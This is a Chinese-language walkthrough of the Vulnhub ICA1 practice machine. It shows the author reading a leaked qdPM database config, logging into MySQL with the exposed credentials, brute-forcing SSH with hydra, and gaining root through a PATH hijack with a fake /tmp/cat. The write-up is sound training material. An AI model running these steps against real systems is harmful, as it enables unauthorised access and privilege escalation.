---

title: Vulnhub--ICA1
categories: [渗透靶场, Vulnhub]

---

## 渗透复现

1. Web站点CMS框架存在数据库文件泄露
2. 利用数据库文件泄露的数据进入数据库拿到用户名和登录密码
3. hydra进行ssh端口账号密码的爆破
4. 通过伪造文件，设置环境变量优先于root文件路径执行的方式，成功利用root文件提权

## 知识扩展

1. 进入数据库后敏感信息的收集
2. hydra爆破ssh端口
3. 伪造文件，通过设置环境变量优先执行方式提权

## 靶机地址

https://www.vulnhub.com/entry/ica-1,748/

## 主机发现

（1）攻击机

```python
192.168.88.128
```

（2）目标靶机

```python
192.168.88.134
```

## 信息收集

### 端口扫描

![image-20240828171115147](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281711212.png)

### 端口访问

![image-20240828171125496](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281711543.png)

### 目录扫描

![image-20240828171133643](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281711707.png)

### 目录爆破

![image-20240828171144306](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281711371.png)

### 目录访问

（1）/backups/

![image-20240828171200126](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281712168.png)

（2）/install/index.php?upgrade/

![image-20240828171210855](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281712899.png)

（3）/manual/index.html

![image-20240828171216679](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281712731.png)

（4）/readme.txt

![image-20240828171227581](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281712621.png)

（5）/template/plugins/

![image-20240828171237946](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281712996.png)

（6）/uploads/

![image-20240828171244747](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281712791.png)

## 实施攻击

（1）页面暴露了框架版本信息

![image-20240828171250839](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281712887.png)

（2）网上查询框架相关版本存在密码泄露漏洞，访问路径为

```python
/core/config/databases.yml
```

![image-20240828171258694](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281712749.png)

（3）尝试访问漏洞路径，拿到数据库的账号密码

```py
qdpmadmin
UcVQCMQk2STVeS6J
```

![image-20240828171306685](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281713732.png)

（4）登录数据库

```python
mysql -h 192.168.88.134 -u qdpmadmin -p 
UcVQCMQk2STVeS6J
```

![image-20240828171313348](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281713406.png)

（5）进行数据库信息收集，在staff数据库下收集到用户名和密码

```python
show databases;
select* from user;
select* from login;
```

![image-20240828171324304](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281713358.png)

![image-20240828171335076](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281713143.png)

（6）将密码进行base64解码过后，利用获取到的用户名和密码对ssh端口进行爆破（因为Web站点是邮箱登录，可以排除）

```python
#注意：需要将用户名的首字母改成小写
hydra -L user.txt -P key.txt ssh://192.168.88.134
```

![image-20240828171345831](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281713891.png)

![image-20240828171353397](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281713443.png)

![image-20240828171402769](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281714821.png)

（7）ssh远程登录

![image-20240828171411109](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281714171.png)

## 提权

（1）信息收集

![image-20240828174948493](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281749544.png)

（2）查找suid文件时，发现了不同寻常的文件/opt/get_access，cat查看该文件的时候出现乱码

![image-20240828171427017](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281714079.png)

（3）采用字符串读取的方式读取该文件

```python
strings 代替 cat
```

![image-20240828171439058](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281714110.png)

（4）get_access文件属主为root，并且该文件在运行过程中，执行了/root/system.info目录下的cat文件

![image-20240828171449489](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281714556.png)

（5）环境变量提权

```python
#因此，可以通过伪造cat文件，将伪造的cat文件路径设置为环境变量，实现文件执行截断提权
#因为在计算机系统中是文件的执行是根据环境变量的路径来寻找对应的可执行文件，并且是先找到谁就用谁。
#当伪造的cat文件路径设置成为环境变量之后，系统将优先执行伪造的cat文件，而不是/root/system.info目录下的cat文件
#在/tmp目录下创建cat文件，内容为/bin/bash
echo '/bin/bash' > /tmp/cat

#赋予/tmp/cat文件权限
chmod +x /tmp/cat

#将路径/tmp目录设置为环境变量，优先执行/tmp目录下的cat文件，从而实现提权
export PATH=/tmp:$PATH
```

![image-20240828171500103](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281715150.png)